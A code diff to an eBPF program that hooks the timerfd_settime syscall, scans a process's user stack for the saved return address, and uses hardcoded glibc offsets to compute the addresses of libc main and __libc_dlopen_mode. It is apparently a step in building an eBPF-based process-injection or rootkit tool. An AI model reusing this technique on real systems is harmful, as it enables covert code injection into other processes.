@@ -12,7 +12,8 @@
 #include "defs.h"
 
 #define OPCODE_JUMP_BYTE_0 0xe8
-#define OPCODES_SYSCALL_CALL 0
+#define GLIBC_OFFSET_MAIN_TO_SYSCALL 0xf00d0
+#define GLIBC_OFFSET_MAIN_TO_DLOPEN 0x12f120
 
 struct sys_timerfd_settime_enter_ctx {
     unsigned long long unused; //Pointer to pt_regs
@@ -57,7 +58,7 @@ static __always_inline int check_syscall_opcodes(__u8* opcodes){
 }   
 
 static __always_inline int stack_extract_return_address_plt(__u64 stack){
-    //We now have a possible call instruction, we check if it starts with the correct format
+    //We have a possible call instruction, we check if it starts with the correct format
     __u8 *op = (__u8*)(stack - 0x5);
     __u8 opcode_arr[5];
     bpf_probe_read(&opcode_arr, 5*sizeof(__u8), op);
@@ -66,7 +67,8 @@ static __always_inline int stack_extract_return_address_plt(__u64 stack){
         return -1;
     }
     
-    //We have localized the call instruction. We proceed to get the offset of the call.
+    //We have localized the call instruction and thus quite probably the saved RIP. 
+    //We proceed to get the offset of the call.
     __u32 offset;
     if(bpf_probe_read_user(&offset, sizeof(__u32), &op[1])<0){
         bpf_printk("Failed to read op[1]\n");
@@ -179,6 +181,9 @@ int sys_enter_timerfd_settime(struct sys_timerfd_settime_enter_ctx *ctx){
     bpf_printk("Timer %i to scan at address %lx\n", fd, scanner);
     #pragma unroll
     for(__u64 ii=0; ii<100; ii++){
+        //We got a foothold in the stack via the syscall argument, now we scan to lower memory
+        //positions assuming those are the saced RIP. We will then perform checks in order to see
+        //if it truly is the saved RIP (checking that there is a path to the actual syscall).
         bpf_probe_read(&address, sizeof(__u64), (void*)scanner - ii);
         //bpf_printk("stack: %lx\n", address);
         if(stack_extract_return_address_plt(address)==0){
@@ -234,7 +239,8 @@ int sys_exit_timerfd_settime(struct sys_timerfd_settime_exit_ctx *ctx){
 
     struct inj_ret_address_data addr = *inj_ret_addr;
     bpf_printk("PID: %u, SYSCALL_ADDR: %lx, STACK_RET_ADDR: %lx", pid, addr.libc_syscall_address, addr.stack_ret_address);
-
+    bpf_printk("Address of libc main: %lx\n", addr.libc_syscall_address - GLIBC_OFFSET_MAIN_TO_SYSCALL);
+    bpf_printk("Address of libc_dlopen_mode: %lx\n", addr.libc_syscall_address - GLIBC_OFFSET_MAIN_TO_SYSCALL + GLIBC_OFFSET_MAIN_TO_DLOPEN);
 
     return 0;
 }
